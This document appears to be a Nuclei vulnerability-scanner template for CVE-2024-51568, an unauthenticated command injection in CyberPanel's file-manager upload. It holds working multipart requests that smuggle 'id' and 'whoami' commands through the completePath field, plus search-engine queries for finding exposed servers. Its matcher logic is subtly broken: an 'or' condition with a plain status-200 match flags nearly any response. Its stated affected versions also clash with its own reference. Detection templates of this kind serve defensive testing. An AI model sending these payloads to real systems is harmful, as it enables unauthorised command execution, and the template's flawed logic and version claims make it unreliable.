id: CVE-2024-51568

info:
  name: CyberPanel - Command Injection via FileManager Upload
  author: pranjal
  severity: critical
  description: |
    CyberPanel before 2.3.5 contains a command injection vulnerability caused by unsanitized completePath 
    parameter in ProcessUtilities.outputExecutioner() function. This allows unauthenticated remote attackers 
    to execute arbitrary commands via the /filemanager/upload endpoint by injecting shell metacharacters 
    in the input. The vulnerability exists in the file upload functionality where the completePath parameter 
    is directly used in shell commands without proper sanitization.
  impact: |
    Attackers can execute arbitrary commands on the server, potentially leading to complete system compromise, 
    data theft, and lateral movement within the network. This vulnerability has been exploited in the wild 
    and affects thousands of CyberPanel instances.
  reference:
    - https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/cyberpanel_preauth_rce_multi_cve.rb
    - https://nvd.nist.gov/vuln/detail/CVE-2024-51568
    - https://cwe.mitre.org/data/definitions/78.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2024-51568
    cwe-id: CWE-78
    cpe: cpe:2.3:a:cyberpanel:cyberpanel:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: cyberpanel
    product: cyberpanel
    shodan-query: 'http.html:"cyberpanel"'
    fofa-query: 'app="CyberPanel"'
  tags: cve,cve2024,cyberpanel,rce,command-injection,filemanager,kev,intrusive

flow: http(1) && http(2) && http(3)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

      - |
        POST /filemanager/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(16)}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json, text/plain, */*
        Referer: {{RootURL}}/filemanager/

        ------WebKitFormBoundary{{rand_base(16)}}
        Content-Disposition: form-data; name="completePath"

        /tmp/; id; echo {{marker}}; #
        ------WebKitFormBoundary{{rand_base(16)}}
        Content-Disposition: form-data; name="file"; filename="test.txt"
        Content-Type: text/plain

        test
        ------WebKitFormBoundary{{rand_base(16)}}--

      - |
        POST /filemanager/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(16)}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json, text/plain, */*
        Referer: {{RootURL}}/filemanager/

        ------WebKitFormBoundary{{rand_base(16)}}
        Content-Disposition: form-data; name="completePath"

        /tmp/; whoami; echo {{marker2}}; #
        ------WebKitFormBoundary{{rand_base(16)}}
        Content-Disposition: form-data; name="file"; filename="test2.txt"
        Content-Type: text/plain

        test2
        ------WebKitFormBoundary{{rand_base(16)}}--

    variables:
      marker: "{{rand_base(8)}}"
      marker2: "{{rand_base(8)}}"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
          - "{{marker}}"
        condition: and

      - type: word
        part: body
        words:
          - "www-data"
          - "root"
          - "{{marker2}}"
        condition: and

      - type: regex
        part: body
        regex:
          - 'uid=[0-9]+.*gid=[0-9]+.*groups='
          - 'requestStatus":'
          - 'www-data|root|cyberpanel'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        name: command_output
        regex:
          - 'uid=([0-9]+).*gid=([0-9]+).*groups=([^\\n]+)'
        group: 0

      - type: regex
        part: body
        name: username
        regex:
          - '(www-data|root|cyberpanel)'
        group: 1

# Test with debug flag: nuclei -t CVE-2024-51568.yaml -target http://target.com -debug
# This template tests for command injection in CyberPanel's filemanager upload endpoint
# The vulnerability allows unauthenticated command execution via shell metacharacters in completePath parameter
# 
# For validation setup, use the provided Docker environment:
# docker run -d -p 8090:8090 --name cyberpanel-vuln cyberpanel/cyberpanel:2.3.4
# 
# Test against: http://localhost:8090 